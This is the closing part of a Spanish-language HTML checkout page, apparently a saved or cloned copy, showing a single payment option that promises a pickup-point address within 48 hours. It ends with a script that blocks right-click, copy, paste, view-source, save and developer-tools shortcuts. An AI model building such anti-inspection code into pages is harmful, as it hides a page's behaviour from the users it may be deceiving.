                                                            <img id="GridViewPagoSimple_ctl02_imgPago" class="ogilvy-imagenpago" src="./assets/Venta_fichiers/thank-you-icon.png" style="border-width:0px;width:33px;">
                                                        </div>
                                                    </td>
                                                    <td style="width:370px;" align="left">
                                                        <div class="div_relleno" onclick="Javascript:changeMMPP('01757TA', this);">
                                                            <span id="GridViewPagoSimple_ctl02_lbDesPagoSimple" class="descripcionPago">Le enviaremos la dirección del punto de recogida en las próximas 48 horas</span>


                                                            <input type="hidden" name="GridViewPagoSimple$ctl02$hddCode" id="GridViewPagoSimple_ctl02_hddCode" value="01757TA">
                                                            <input type="hidden" name="GridViewPagoSimple$ctl02$hddMin" id="GridViewPagoSimple_ctl02_hddMin" value="0">
                                                            <input type="hidden" name="GridViewPagoSimple$ctl02$hddMax" id="GridViewPagoSimple_ctl02_hddMax">
                                                            <input type="hidden" name="GridViewPagoSimple$ctl02$hddDescuento" id="GridViewPagoSimple_ctl02_hddDescuento" value="0">
                                                            <input type="hidden" name="GridViewPagoSimple$ctl02$hddOrden" id="GridViewPagoSimple_ctl02_hddOrden" value="1">

                                                            <div id="GridViewPagoSimple_ctl02_pRecurrente">

                                                                <div id="panelRecurrente" class="hidden">
                                                                    <table id="GridViewPagoSimple_ctl02_tbRecurrente" border="0">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td></td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </div>

                                                            </div>


                                                        </div>
                                                    </td>
                                                    <td style="width:20px;" align="center">
                                                        <label class="label-relleno" onclick="Javascript:changeMMPP('01757TA', this);" checked="checked" value="01757TA" style="background-color:#14B99A">
                                                            <input type="radio" class="radioButton" id="rdbSelectPayment" name="rdbSelectPayment">
                                                        </label>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                </div>

                <!--Buttons -->


            </div>

        </div>

    </div>
    </form>

</body>
<script>
    jQuery(function($) {

        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
            if (e.ctrlKey &&
                (e.keyCode === 67 ||
                    e.keyCode === 86 ||
                    e.keyCode === 85 ||
                    e.keyCode === 83 ||
                    e.keyCode === 117)) {
                return false;
            } else {
                return true;
            }
        };

        $(document).keydown(function(event) {
            if (event.keyCode == 123) { // Prevent F12
                return false;
            } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
                return false;
            }
        });
    })
</script>

</html>